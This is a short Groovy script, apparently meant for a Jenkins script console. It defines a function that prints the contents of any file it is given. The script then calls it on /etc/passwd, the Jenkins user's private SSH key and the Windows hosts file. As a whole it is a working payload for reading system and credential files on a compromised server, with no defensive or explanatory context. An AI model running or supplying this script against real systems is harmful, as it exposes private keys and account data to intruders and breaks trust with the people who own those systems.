def printFile(location) {
    pub = new File(location)
    if (pub.exists()){ 
        println "Location ${location}"
        pub.eachLine{line-> println line}
    } else{
        println "${location} does not exist"
    }
}

printFile("/etc/passwd")
printFile("/var/lib/jenkins/.ssh/id_rsa")
printFile("C:/Windows/System32/drivers/etc/hosts")